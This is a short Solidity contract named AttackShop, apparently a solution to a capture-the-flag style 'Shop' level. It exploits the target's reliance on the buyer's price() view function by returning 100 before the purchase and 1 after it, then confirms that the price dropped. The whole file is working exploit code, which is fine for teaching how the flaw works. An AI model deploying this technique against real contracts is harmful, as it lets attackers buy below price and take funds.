// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
    function buy() external;
}

contract AttackShop {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function price() external view returns (uint256) {
        return (target.isSold() ? 1 : 100);
    }

    function hack() external {
        target.buy();
        require(target.price() == 1, "Price does not equal 1");
    }
}
